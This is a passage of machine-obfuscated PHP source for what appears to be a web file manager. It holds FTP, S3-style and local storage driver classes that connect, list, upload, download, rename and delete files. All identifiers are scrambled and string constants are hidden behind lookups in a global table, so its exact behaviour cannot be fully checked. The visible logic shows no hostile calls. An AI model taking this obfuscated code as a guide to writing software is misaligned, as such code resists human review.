$this->iconvApp($this->pathBase); $åüº™æ = $this->iconvApp($åüº™æ); if (substr($Í‚¡²š, 0, 2) == $ÈÎµä [1512]) { $Í‚¡²š = BASIC_PATH . substr($Í‚¡²š, 2); } if (substr($åüº™æ, 0, 2) == $ÈÎµä [1512]) { $åüº™æ = BASIC_PATH . substr($åüº™æ, 2); } $Í‚¡²š = KodIO::clear($Í‚¡²š); $åüº™æ = KodIO::clear($åüº™æ); $åüº™æ = substr($åüº™æ, strlen($Í‚¡²š)); if (empty($this->pathDriver)) { return $åüº™æ; } return $this->pathDriver . $ÈÎµä [8] . ltrim($åüº™æ, $ÈÎµä [8]); } private function _init($¢ûü¿şä = array()) { $ˆ†æÈ®Õ =& $_SERVER[¹Éµ„ºå]; if (!function_exists($ˆ†æÈ®Õ[1639])) { throw new Exception(LNG($ˆ†æÈ®Õ[1640])); } $this->config = $¢ûü¿şä; $this->charsetReset($¢ûü¿şä); foreach ($¢ûü¿şä as $Ò¦¢ÁŒØ => $ì¬Ö—Â) { if (isset($this->{$Ò¦¢ÁŒØ})) { $this->{$Ò¦¢ÁŒØ} = $ì¬Ö—Â; } } return $this->_login($¢ûü¿şä); } private function _login($û¥Íòª¾) { $×’®€Ä‹ =& $_SERVER[¹Éµ„ºå]; static $ß¿·İ… = array(); $ƒÔ×¡Ë = md5(json_encode($û¥Íòª¾)); if (isset($ß¿·İ…[$ƒÔ×¡Ë])) { foreach ($ß¿·İ…[$ƒÔ×¡Ë] as $—Ñ¸‚Ş’ => $†˜êŒÑ) { $this->{$—Ñ¸‚Ş’} = $†˜êŒÑ; } return !0; } $Ì‹Äıöë = parse_url(trim($this->server, $×’®€Ä‹[8])); $this->host = $Ì‹Äıöë[$×’®€Ä‹[206]]; $¬ÏÈÕŞÓ = isset($Ì‹Äıöë[$×’®€Ä‹[205]]) && $Ì‹Äıöë[$×’®€Ä‹[205]] == $×’®€Ä‹[1641] ? !0 : !1; $this->scheme = $¬ÏÈÕŞÓ ? $×’®€Ä‹[1642] : $×’®€Ä‹[1643]; $this->port = isset($Ì‹Äıöë[$×’®€Ä‹[207]]) ? $Ì‹Äıöë[$×’®€Ä‹[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($×’®€Ä‹[1644]) . $this->host . $×’®€Ä‹[4] . $this->port, !0); return !1; } $›ÄÎ¸¢ë = @ftp_login($this->connect, $this->username, $this->userpass); if (!$›ÄÎ¸¢ë) { $this->writeLog(LNG($×’®€Ä‹[1645]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $×’®€Ä‹[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $­ßëğø¾ = $this->pasv == $×’®€Ä‹[91] ? !0 : !1; @ftp_pasv($this->connect, $­ßëğø¾); $ß¿·İ…[$ƒÔ×¡Ë] = array($×’®€Ä‹[1646] => $this->connect, $×’®€Ä‹[206] => $this->host, $×’®€Ä‹[205] => $this->scheme, $×’®€Ä‹[207] => $this->port); return $›ÄÎ¸¢ë; } private function _isconn($¼–¢”Çò = true) { if (is_resource($this->connect)) { return !0; } if (!$¼–¢”Çò) { return !1; } return $this->_login($this->config); } public function mkfile($¿œßÖõ, $ìÕÎğ° = '', $óÁ×ì„Ó = REPEAT_RENAME) { if ($this->setContent($¿œßÖõ, $ìÕÎğ°)) { return $this->getPathOuter($¿œßÖõ); } $this->writeLog(LNG($_SERVER[¹Éµ„ºå][1647]), !0); return !1; } public function mkdir($ĞÙ‡áÏ«, $éıİ´Ú† = REPEAT_SKIP) { $°©½ÜÕ¯ =& $_SERVER[¹Éµ„ºå]; if (!$ĞÙ‡áÏ« || $ĞÙ‡áÏ« == $°©½ÜÕ¯[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ĞÙ‡áÏ« = $this->iconvSystem($ĞÙ‡áÏ«); if ($this->_isFolder($ĞÙ‡áÏ«) || @ftp_mkdir($this->connect, $ĞÙ‡áÏ«)) { return $this->getPathOuter($ĞÙ‡áÏ«); } if (!$this->mkdir($this->pathFather($ĞÙ‡áÏ«))) { return !1; } if ($ĞÙ‡áÏ« = @ftp_mkdir($this->connect, $ĞÙ‡áÏ«)) { return $this->getPathOuter($ĞÙ‡áÏ«); } $ÓÀ¥¡½Ë = __FUNCTION__ . $°©½ÜÕ¯[1648]; $this->writeLog($ÓÀ¥¡½Ë, !0); return !1; } public function copyFile($şíØ„Ú…, $µ×´·Éâ) { if (!$this->_isconn()) { return !1; } $ÒığÈâæ = $this->pathThis($this->iconvSystem($şíØ„Ú…)); $†¡„Íµî = $this->tempFile($ÒığÈâæ); $çİøš = $this->iconvApp($†¡„Íµî); $this->download($şíØ„Ú…, $çİøš); $¢”±Êì® = $this->upload($µ×´·Éâ, $çİøš); $this->tempFileRemve($†¡„Íµî); return $¢”±Êì®; } public function moveFile($îÊı£Û°, $Ä½äüÆ) { if (!$this->_isconn()) { return !1; } $îÊı£Û° = $this->iconvSystem($îÊı£Û°); $Ä½äüÆ = $this->iconvSystem($Ä½äüÆ); $í–ñ = @ftp_rename($this->connect, $îÊı£Û°, $Ä½äüÆ); if (!$í–ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } return $this->getPathOuter($Ä½äüÆ); } public function delFile($û­¬ˆŠ) { if (!$this->_isconn()) { return !1; } $û­¬ˆŠ = $this->iconvSystem($û­¬ˆŠ); $Ã­‚·¯­ = @ftp_delete($this->connect, $û­¬ˆŠ); if (!$Ã­‚·¯­) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); } return $Ã­‚·¯­; } public function delFolder($ù»ÕãÜ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÜÒ°Ñß = $«…ë¢¹ø = array(); $this->fileList($ù»ÕãÜ, $ÜÒ°Ñß, $«…ë¢¹ø, !0); $this->listItemCache = !0; foreach ($«…ë¢¹ø as $·¤˜ØÑ) { $äÀãúî¸ = $this->iconvSystem($·¤˜ØÑ[$_SERVER[¹Éµ„ºå][32]]); $çô¨æê· = @ftp_delete($this->connect, $äÀãúî¸); if (!$çô¨æê·) { return !1; } } foreach ($ÜÒ°Ñß as $äÀãúî¸) { $äÀãúî¸ = $this->iconvSystem($äÀãúî¸); $çô¨æê· = @ftp_rmdir($this->connect, $äÀãúî¸); if (!$çô¨æê·) { return !1; } } $ù»ÕãÜ = $this->iconvSystem($ù»ÕãÜ); return @ftp_rmdir($this->connect, $ù»ÕãÜ); } public function rename($®Åó§Ş, $Ê“İù¯) { $Ù¤“Îß· =& $_SERVER[¹Éµ„ºå]; if (!$this->_isconn()) { return !1; } $êã©“š = $this->fileNameAuto($this->pathFather($®Åó§Ş), $Ê“İù¯); $êã©“š = $this->iconvSystem($êã©“š); $®Åó§Ş = $this->iconvSystem($®Åó§Ş); $²æÜ–ªì = $this->pathFather($®Åó§Ş); $ÌáªÃëØ = rtrim($²æÜ–ªì, $Ù¤“Îß·[8]) . $Ù¤“Îß·[8] . $êã©“š; $ôáŒ¡­¤ = @ftp_rename($this->connect, $®Åó§Ş, $ÌáªÃëØ); if (!$ôáŒ¡­¤) { $this->writeLog(__FUNCTION__ . $Ù¤“Îß·[1648], !0); return !1; } $ÌáªÃëØ = $this->iconvApp($ÌáªÃëØ); return $this->getPathOuter($ÌáªÃëØ); } private function folderInfo($…ß¤ôÛ–, $úü×±ã˜ = false) { $ó ©±¡Š =& $_SERVER[¹Éµ„ºå]; $›¸“ˆİé = array($ó ©±¡Š[32] => $this->pathThis($…ß¤ôÛ–), $ó ©±¡Š[87] => $this->getPathOuter($ó ©±¡Š[8] . $…ß¤ôÛ–), $ó ©±¡Š[33] => $ó ©±¡Š[78]); if ($úü×±ã˜) { return $›¸“ˆİé; } $›¸“ˆİé[$ó ©±¡Š[231]] = $›¸“ˆİé[$ó ©±¡Š[88]] = 0; $›¸“ˆİé[$ó ©±¡Š[232]] = $›¸“ˆİé[$ó ©±¡Š[233]] = !0; return $›¸“ˆİé; } private function fileInfo($ˆ‘öÅø, $ó›…ŒÖ€ = false, $¯¢•µãÇ = array()) { $¨Ğä¹Í =& $_SERVER[¹Éµ„ºå]; $´€Ğê„î = array($¨Ğä¹Í[32] => $this->pathThis($ˆ‘öÅø), $¨Ğä¹Í[87] => $this->getPathOuter($¨Ğä¹Í[8] . $ˆ‘öÅø), $¨Ğä¹Í[33] => $¨Ğä¹Í[230], $¨Ğä¹Í[79] => isset($¯¢•µãÇ[$¨Ğä¹Í[79]]) ? $¯¢•µãÇ[$¨Ğä¹Í[79]] : 0, $¨Ğä¹Í[166] => $this->ext($ˆ‘öÅø)); if ($ó›…ŒÖ€) { return $´€Ğê„î; } $´€Ğê„î[$¨Ğä¹Í[231]] = $´€Ğê„î[$¨Ğä¹Í[88]] = 0; $´€Ğê„î[$¨Ğä¹Í[232]] = $´€Ğê„î[$¨Ğä¹Í[233]] = !0; $¡Ç¦ıú = $this->iconvSystem($ˆ‘öÅø); $´€Ğê„î[$¨Ğä¹Í[88]] = @ftp_mdtm($this->connect, $¡Ç¦ıú); if (empty($¯¢•µãÇ)) { $¯¢•µãÇ = $this->objectMeta($ˆ‘öÅø); if (!$¯¢•µãÇ) { return $´€Ğê„î; } } $´€Ğê„î[$¨Ğä¹Í[79]] = $¯¢•µãÇ[$¨Ğä¹Í[79]]; return $´€Ğê„î; } public function size($ÇÔ±œÎ) { $Ñğ­ÚÃ = $this->objectMeta($ÇÔ±œÎ); return $Ñğ­ÚÃ ? $Ñğ­ÚÃ[$_SERVER[¹Éµ„ºå][79]] : 0; } public function info($îÈ•›Ò×) { if ($this->isFile($îÈ•›Ò×)) { return $this->fileInfo($îÈ•›Ò×, 0); } else { if ($this->isFolder($îÈ•›Ò×)) { return $this->folderInfo($îÈ•›Ò×); } } return !1; } private function fileList($Ê›¹§Ê, &$Íóºôë‚, &$œ¾¯¼±¿, $‰şÚ‹’Ç = false) { $Ëİœ¿Å› =& $_SERVER[¹Éµ„ºå]; $Ê›¹§Ê = $this->iconvSystem($Ê›¹§Ê); if (!$this->isFolder($Ê›¹§Ê)) { return !1; } $Ê›¹§Ê = rtrim($Ê›¹§Ê, $Ëİœ¿Å›[8]) . $Ëİœ¿Å›[8]; check_abort(); $“ò£Á‚· = @ftp_rawlist($this->connect, $Ê›¹§Ê); if (!$“ò£Á‚·) { $“ò£Á‚· = array(); } $–„Šï = array($Ëİœ¿Å›[10] => 1, $Ëİœ¿Å›[1457] => 1); foreach ($“ò£Á‚· as $ÛÍ•Øƒ) { $–âÌ’´ = $this->_listItem($ÛÍ•Øƒ); if ($–âÌ’´[0] == $Ëİœ¿Å›[850]) { continue; } $¿‘€ôê = $–âÌ’´[8]; if (empty($¿‘€ôê) && $¿‘€ôê !== $Ëİœ¿Å›[228] || isset($–„Šï[$¿‘€ôê])) { continue; } $¿‘€ôê = $this->iconvApp($Ê›¹§Ê . ltrim($¿‘€ôê, $Ëİœ¿Å›[8])); $ÛûÍğÑÕ = array($Ëİœ¿Å›[32] => $¿‘€ôê, $Ëİœ¿Å›[33] => $Ëİœ¿Å›[230], $Ëİœ¿Å›[79] => $–âÌ’´[4]); if (substr($ÛÍ•Øƒ, 0, 1) == $Ëİœ¿Å›[1649]) { $ÛûÍğÑÕ[$Ëİœ¿Å›[33]] = $Ëİœ¿Å›[78]; $ÛûÍğÑÕ[$Ëİœ¿Å›[79]] = 0; } $œ«Ó¥•ä = $ÛûÍğÑÕ[$Ëİœ¿Å›[33]] == $Ëİœ¿Å›[78] ? !0 : !1; $this->cacheMethodInfoSet($¿‘€ôê, $œ«Ó¥•ä, $ÛûÍğÑÕ); if ($œ«Ó¥•ä) { $Íóºôë‚[] = $¿‘€ôê; if ($‰şÚ‹’Ç) { $this->fileList($¿‘€ôê, $Íóºôë‚, $œ¾¯¼±¿, $‰şÚ‹’Ç); } continue; } $œ¾¯¼±¿[] = $ÛûÍğÑÕ; } $this->cacheMethodInfoSet($Ê›¹§Ê, !0); } private function _listItem($ñ ·…ã) { if (empty($ñ ·…ã)) { return array(); } $‘æ¨¹¹ô = preg_split($_SERVER[¹Éµ„ºå][1650], $ñ ·…ã); if (count($‘æ¨¹¹ô) <= 9) { return $‘æ¨¹¹ô; } $‘æ¨¹¹ô[8] = trim(substr($ñ ·…ã, strpos($ñ ·…ã, $‘æ¨¹¹ô[7]) + strlen($‘æ¨¹¹ô[7]))); return array_splice($‘æ¨¹¹ô, 0, 9); } public function listPath($°±Îí¶‹, $”€«ôÈ¿ = false) { $£ûùô’Ù =& $_SERVER[¹Éµ„ºå]; if (!$this->_isconn()) { return !1; } $·ß®º·… = $ó¡ÑÀï = array(); $this->fileList($°±Îí¶‹, $·ß®º·…, $ó¡ÑÀï); foreach ($·ß®º·… as $íä×òü => $ˆàø¼±ó) { $·ß®º·…[$íä×òü] = $this->folderInfo($ˆàø¼±ó, $”€«ôÈ¿); } foreach ($ó¡ÑÀï as $íä×òü => $ˆàø¼±ó) { $ó¡ÑÀï[$íä×òü] = $this->fileInfo($ˆàø¼±ó[$£ûùô’Ù[32]], $”€«ôÈ¿, $ˆàø¼±ó); } return array($£ûùô’Ù[85] => $·ß®º·…, $£ûùô’Ù[86] => $ó¡ÑÀï); } public function has($Ö³àØğø, $›ÔÅ±»Í = false, $§ìÍ¥ ï = true) { $Õñ˜ÕÀõ =& $_SERVER[¹Éµ„ºå]; $ĞÌ²Äá = $ şù¦Æ = array(); $Ëî›ñ›ƒ = $›ÔÅ±»Í ? !0 : !1; $this->fileList($Ö³àØğø, $ĞÌ²Äá, $ şù¦Æ, $Ëî›ñ›ƒ); if ($›ÔÅ±»Í) { return array($Õñ˜ÕÀõ[239] => count($ şù¦Æ), $Õñ˜ÕÀõ[240] => count($ĞÌ²Äá)); } if ($§ìÍ¥ ï) { if (count($ şù¦Æ)) { return !0; } } else { if (count($ĞÌ²Äá)) { return !0; } } return !1; } public function listAll($Ù¸ºŸ°„) { $ÑŸ¦×æ =& $_SERVER[¹Éµ„ºå]; if (!$this->_isconn()) { return !1; } $€ÌËÖ¥® = $ÓÇ±Ò‘ = array(); $this->fileList($Ù¸ºŸ°„, $€ÌËÖ¥®, $ÓÇ±Ò‘, !0); $›Àç·ğİ = array_to_keyvalue($ÓÇ±Ò‘, $ÑŸ¦×æ[32]); foreach ($€ÌËÖ¥® as $™×†ÓÕ–) { if (is_string($™×†ÓÕ–)) { $›Àç·ğİ[$™×†ÓÕ–] = array($ÑŸ¦×æ[79] => 0); } } return $this->listAllFiles($Ù¸ºŸ°„, $›Àç·ğİ); } public function getContent($ß“åµ†’) { if (!$this->_isconn()) { return !1; } $ß“åµ†’ = $this->iconvSystem($ß“åµ†’); return $this->fileSubstr($ß“åµ†’); } public function setContent($õ¡–˜µÚ, $¹¦è¨¿˜ = '') { if (!$this->_isconn()) { return !1; } $¸£åÓòÉ = $this->pathThis($this->iconvSystem($õ¡–˜µÚ)); $Ññ¹ßˆÅ = $this->tempFile($¸£åÓòÉ); file_put_contents($Ññ¹ßˆÅ, $¹¦è¨¿˜); $Æ³‘ìÃö = $this->upload($õ¡–˜µÚ, $this->iconvApp($Ññ¹ßˆÅ)); $this->tempFileRemve($Ññ¹ßˆÅ); return $Æ³‘ìÃö; } public function fileSubstr($ššÂÎâè, $‘â®»Ú‰ = 0, $€ÀÖ¯Ç¨ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ššÂÎâè, $‘â®»Ú‰, $€ÀÖ¯Ç¨); } private function ftpRequest($Ã­¥Ä, $ÆŸßö‚€ = 0, $øğ¾¡¯— = false) { $ö˜Ç¿‹Ğ =& $_SERVER[¹Éµ„ºå]; $Ã­¥Ä = $ö˜Ç¿‹Ğ[8] . ltrim(str_ltrim($Ã­¥Ä, $this->ftpPath), $ö˜Ç¿‹Ğ[8]); $Ã­¥Ä = $this->iconvSystem($Ã­¥Ä); $´”ç–ú = $this->scheme . $this->host . $ö˜Ç¿‹Ğ[4] . $this->port; $º€úªí = curl_init(); curl_setopt($º€úªí, CURLOPT_URL, $´”ç–ú . $this->pathEncode($Ã­¥Ä)); curl_setopt($º€úªí, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($øğ¾¡¯—) { $ê²“†ò = $ÆŸßö‚€ + $øğ¾¡¯— - 1; curl_setopt($º€úªí, CURLOPT_RANGE, "{$ÆŸßö‚€}\x2d{$ê²“†ò}"); } curl_setopt($º€úªí, CURLOPT_RETURNTRANSFER, 1); $Œ¿³Ê£ = curl_exec($º€úªí); curl_close($º€úªí); return $Œ¿³Ê£; } public function upload($¡ÉÀÉÛÈ, $ı³÷ÆÚ£, $üòÀ½« = false, $Á¹æ°ˆÛ = REPEAT_REPLACE) { if (!$ı³÷ÆÚ£ || !@file_exists($ı³÷ÆÚ£)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¡ÉÀÉÛÈ))) { return !1; } $¡ÉÀÉÛÈ = $this->iconvSystem($¡ÉÀÉÛÈ); $ı³÷ÆÚ£ = $this->iconvSystem($ı³÷ÆÚ£); $™ãÅÌì€ = ftp_nb_put($this->connect, $¡ÉÀÉÛÈ, $ı³÷ÆÚ£, FTP_BINARY); while ($™ãÅÌì€ == FTP_MOREDATA) { $™ãÅÌì€ = ftp_nb_continue($this->connect); } if ($™ãÅÌì€ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } return $this->getPathOuter($¡ÉÀÉÛÈ); } public function download($Öº¢¬¨¹, $ñßë—­ = '') { if (!$this->_isconn()) { return !1; } $®¾çôä‡ = $this->pathFather($ñßë—­); if (!IO::mkdir($®¾çôä‡)) { return !1; } $Öº¢¬¨¹ = $this->iconvSystem($Öº¢¬¨¹); $ñßë—­ = $this->iconvSystem($ñßë—­); $¸ñ’°ş¬ = ftp_nb_get($this->connect, $ñßë—­, $Öº¢¬¨¹, FTP_BINARY); while ($¸ñ’°ş¬ == FTP_MOREDATA) { $¸ñ’°ş¬ = ftp_nb_continue($this->connect); } if ($¸ñ’°ş¬ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } return $this->iconvApp($ñßë—­); } public function exist($Óèˆ¡Úî) { return $this->isFile($Óèˆ¡Úî) || $this->isFolder($Óèˆ¡Úî); } public function isFile($û´±¨¸») { return !$this->isFolder($û´±¨¸») && $this->objectMeta($û´±¨¸»); } public function isFolder($íñ‘õ¾) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][177], $íñ‘õ¾); } protected function objectMeta($–íÓòğÒ) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][179], $–íÓòğÒ); } protected function _objectMeta($ñ€¶Ñæ») { $™‚¨Ïë¦ =& $_SERVER[¹Éµ„ºå]; if ($ñ€¶Ñæ» == $™‚¨Ïë¦[12] || $ñ€¶Ñæ» == $™‚¨Ïë¦[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ñ€¶Ñæ» = $this->iconvSystem($ñ€¶Ñæ»); $ºŒğÏŸØ = array($™‚¨Ïë¦[32] => $this->iconvApp($ñ€¶Ñæ»), $™‚¨Ïë¦[33] => $™‚¨Ïë¦[230], $™‚¨Ïë¦[79] => 0); $ú‚³ş = @ftp_size($this->connect, $ñ€¶Ñæ»); if ($ú‚³ş != -1) { $ºŒğÏŸØ[$™‚¨Ïë¦[79]] = $ú‚³ş; } else { $¿ÂóööÄ = @ftp_chdir($this->connect, $ñ€¶Ñæ»); if (!$¿ÂóööÄ) { return !1; } @ftp_chdir($this->connect, $™‚¨Ïë¦[8]); $ºŒğÏŸØ[$™‚¨Ïë¦[33]] = $™‚¨Ïë¦[78]; } return $ºŒğÏŸØ; } protected function _isFolder($Ê©Òå±ø) { $«Şõ¿¡¤ =& $_SERVER[¹Éµ„ºå]; if ($Ê©Òå±ø == $«Şõ¿¡¤[12] || $Ê©Òå±ø == $«Şõ¿¡¤[8]) { return !0; } $‰¬ÚÇ•‰ = $this->_objectMeta($Ê©Òå±ø); return isset($‰¬ÚÇ•‰[$«Şõ¿¡¤[33]]) && $‰¬ÚÇ•‰[$«Şõ¿¡¤[33]] == $«Şõ¿¡¤[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Èé Ñ) { parent::__construct($Èé Ñ); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } public function uploadLink($¼ …Õ­, $¿Õ•Œé = 0) { $Ë•äó¨‰ =& $_SERVER[¹Éµ„ºå]; if ($this->isUploadServer()) { return; } $›¶¥ÂÏ© = $this->getType(); if (!in_array($›¶¥ÂÏ©, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $´Ãšœèù = (!$¿Õ•Œé ? 1 : ceil($¿Õ•Œé / pow(1024, 3))) * 3600 * 4; $Ö³Ÿ©ÊÕ = $this->uploadMultiData($¼ …Õ­, $´Ãšœèù); if ($Ö³Ÿ©ÊÕ) { $Ö³Ÿ©ÊÕ[$Ë•äó¨‰[95]] = $¼ …Õ­; $Ö³Ÿ©ÊÕ[$Ë•äó¨‰[96]] = $›¶¥ÂÏ©; } return $Ö³Ÿ©ÊÕ; } public function fileOutImage($Ä¦ïû·Ô, $ù¼³ì³ = 250) { if ($this->size($Ä¦ïû·Ô) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ä¦ïû·Ô, $ù¼³ì³); } $…É÷¡±¼ = $this->link($Ä¦ïû·Ô); $…É÷¡±¼ .= $_SERVER[¹Éµ„ºå][1651] . $ù¼³ì³; $this->fileOutLink($…É÷¡±¼); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($†¡£§˜Ø) { if (substr($†¡£§˜Ø, 0, 2) == $_SERVER[¹Éµ„ºå][1512]) { $†¡£§˜Ø = BASIC_PATH . substr($†¡£§˜Ø, 2); } return $†¡£§˜Ø; } public function iconvApp($…´ª»¾ˆ) { $Ğ–Ş’„ø =& $_SERVER[¹Éµ„ºå]; global $config; return $this->iconvTo($…´ª»¾ˆ, $config[$Ğ–Ş’„ø[1637]], $config[$Ğ–Ş’„ø[1636]]); } public function iconvSystem($ìßÑÂÔ) { $è— æ¯ =& $_SERVER[¹Éµ„ºå]; global $config; return $this->iconvTo($ìßÑÂÔ, $config[$è— æ¯[1636]], $config[$è— æ¯[1637]]); } public function getPathOuter($áÖ×‘«») { $üÏÍáæã =& $_SERVER[¹Éµ„ºå]; $—ï›¢ = $this->iconvApp($this->pathBase); $áÖ×‘«» = $this->iconvApp($áÖ×‘«»); if (substr($—ï›¢, 0, 2) == $üÏÍáæã[1512]) { $—ï›¢ = BASIC_PATH . substr($—ï›¢, 2); } if (substr($áÖ×‘«», 0, 2) == $üÏÍáæã[1512]) { $áÖ×‘«» = BASIC_PATH . substr($áÖ×‘«», 2); } $—ï›¢ = KodIO::clear($—ï›¢); $áÖ×‘«» = KodIO::clear($áÖ×‘«»); $áÖ×‘«» = substr($áÖ×‘«», strlen($—ï›¢)); if (empty($this->pathDriver)) { return $áÖ×‘«»; } return $this->pathDriver . $üÏÍáæã[8] . ltrim($áÖ×‘«», $üÏÍáæã[8]); } public function mkfile($ŠÖ˜ø“ª, $Úö•·¨ì = '', $ÔóÔ—ú = REPEAT_RENAME) { $ŠÖ˜ø“ª = $this->iconvSystem($ŠÖ˜ø“ª); @touch($ŠÖ˜ø“ª); if ($Úö•·¨ì) { file_put_contents($ŠÖ˜ø“ª, $Úö•·¨ì); } @chmod($ŠÖ˜ø“ª, $this->pathAuth); if (is_file($ŠÖ˜ø“ª)) { return $this->getPathOuter($ŠÖ˜ø“ª); } $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } public function mkdir($…ø¶Ä, $…ñ¬Üí = REPEAT_SKIP) { $…ø¶Ä = $this->iconvSystem($…ø¶Ä); if (is_dir($…ø¶Ä)) { return $this->getPathOuter($…ø¶Ä); } @mkdir($…ø¶Ä, $this->pathAuth, !0); @chmod($…ø¶Ä, $this->pathAuth); if (is_dir($…ø¶Ä)) { return $this->getPathOuter($…ø¶Ä); } $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } public function copyFile($Ëó˜šú§, $–†şØë) { $this->mkdir($this->pathFather($–†şØë)); $Ëó˜šú§ = $this->iconvSystem($Ëó˜šú§); $–†şØë = $this->iconvSystem($–†şØë); $ôô¯ªßñ = copy_64($Ëó˜šú§, $–†şØë); @chmod($–†şØë, $this->pathAuth); if ($ôô¯ªßñ) { return $this->getPathOuter($–†şØë); } $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } public function moveFile($ ¸ªá¡û, $ İÍ ÖÍ) { $this->mkdir($this->pathFather($ İÍ ÖÍ)); $ ¸ªá¡û = $this->iconvSystem($ ¸ªá¡û); $ İÍ ÖÍ = $this->iconvSystem($ İÍ ÖÍ); $ŸºŸ›­¿ = intval(@rename($ ¸ªá¡û, $ İÍ ÖÍ)); if (!$ŸºŸ›­¿) { if ($ŸºŸ›­¿ = intval(@copy_64($ ¸ªá¡û, $ İÍ ÖÍ))) { @unlink($ ¸ªá¡û); } } @chmod($ İÍ ÖÍ, $this->pathAuth); if ($ŸºŸ›­¿) { return $this->getPathOuter($ İÍ ÖÍ); } $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } public function movePath($ïèİÉìà, $õÎÄúÑñ, $ê±¹Ô¯Ü = false) { $Â¨˜¢ƒı =& $_SERVER[¹Éµ„ºå]; $ïèİÉìà = $this->iconvSystem($ïèİÉìà); $õÎÄúÑñ = $this->iconvSystem($õÎÄúÑñ); $ûÅ’¹èÔ = rtrim($õÎÄúÑñ, $Â¨˜¢ƒı[8]) . $Â¨˜¢ƒı[8] . ($ê±¹Ô¯Ü ? $ê±¹Ô¯Ü : get_path_this($ïèİÉìà)); if (file_exists($ûÅ’¹èÔ)) { return !1; } $‹ò¼†½ = intval(@rename($ïèİÉìà, $ûÅ’¹èÔ)); $‹ò¼†½ = file_exists($ûÅ’¹èÔ); if ($‹ò¼†½) { return $this->getPathOuter($ûÅ’¹èÔ); } $this->writeLog(__FUNCTION__ . $Â¨˜¢ƒı[1648], !0); return !1; } public function delFile($Ù³œ“²¾) { $Ù³œ“²¾ = $this->iconvSystem($Ù³œ“²¾); if (!@unlink($Ù³œ“²¾)) { @chmod($Ù³œ“²¾, $this->pathAuth); if (@unlink($Ù³œ“²¾)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¹Éµ„ºå][1648], !0); return !1; } return !0; } public function delFolder($­µù§) { $—æ¸ìõ =& $_SERVER[¹Éµ„ºå]; $­µù§ = $this->iconvSystem($­µù§); if (!is_dir($­µù§)) { return !0; } if (!($ªñãÉå = opendir($­µù§))) { return !1; } while (($’Ì™›Ü = readdir($ªñãÉå)) !== !1) { if ($’Ì™›Ü == $—æ¸ìõ[10] || $’Ì™›Ü == $—æ¸ìõ[1457]) { continue; } $ï˜¦½è = $­µù§ . $—æ¸ìõ[8] . $’Ì™›Ü; if (is_file($ï˜¦½è) || is_link($ï˜¦½è)) { if (!unlink($ï˜¦½è)) { chmod($ï˜¦½è, $this->pathAuth); if (!unlink($ï˜¦½è)) { return !1; } } } else { if (is_dir($ï˜¦½è)) { chmod($ï˜¦½è, $this->pathAuth); $ï˜¦½è = $this->iconvApp($ï˜¦½è); if (!$this->delFolder($ï˜¦½è)) { return !1; } } } } closedir($ªñãÉå); return rmdir($­µù§); } public function rename($ĞÆâÂÃÌ, $¯ó’îè†) { $ãÑÌ¤Ò¾ =& $_SERVER[¹Éµ„ºå]; $¼Ÿ€£Æ° = $this->fileNameAuto($this->pathFather($ĞÆâÂÃÌ), $¯ó’îè†); $¼Ÿ€£Æ° = $this->iconvSystem($¼Ÿ€£Æ°); $ĞÆâÂÃÌ = $this->iconvSystem($ĞÆâÂÃÌ); $›˜ÆÜùê = $this->pathFather($ĞÆâÂÃÌ); $—åÏ›Æ¨ = rtrim($›˜ÆÜùê, $ãÑÌ¤Ò¾[8]) . $ãÑÌ¤Ò¾[8] . $¼Ÿ€£Æ°; $äÓ¨Ü½ = @rename($ĞÆâÂÃÌ, $—åÏ›Æ¨); $—åÏ›Æ¨ = $this->iconvApp($—åÏ›Æ¨); if ($äÓ¨Ü½) { return $this->getPathOuter($—åÏ›Æ¨); } $this->writeLog(__FUNCTION__ . $ãÑÌ¤Ò¾[1648], !0); return !1; } public function size($³¨Œé”ë) { $³¨Œé”ë = $this->iconvSystem($³¨Œé”ë); return filesize_64($³¨Œé”ë); } public function info($ô«íßï‰) { $ô«íßï‰ = $this->iconvSystem($ô«íßï‰); if ($this->isFolder($ô«íßï‰)) { return $this->folderInfo($ô«íßï‰); } else { if ($this->isFile($ô«íßï‰)) { return $this->fileInfo($ô«íßï‰); } } return !1; } protected function infoChildren($ã„ãÒµŸ, &$ô¶²ã‹Œ, $€É¾æÉı = true) { $å¢¸ÖÔ™ =& $_SERVER[¹Éµ„ºå]; check_abort_echo(); $ã„ãÒµŸ = rtrim($ã„ãÒµŸ, $å¢¸ÖÔ™[8]) . $å¢¸ÖÔ™[8]; if ($€É¾æÉı) { $ã„ãÒµŸ = $this->iconvSystem($ã„ãÒµŸ); } if (!($ñıÆœ‡ = @opendir($ã„ãÒµŸ))) { return; } while (($…ö…©Ú˜ = readdir($ñıÆœ‡)) !== !1) { if ($…ö…©Ú˜ == $å¢¸ÖÔ™[10] || $…ö…©Ú˜ == 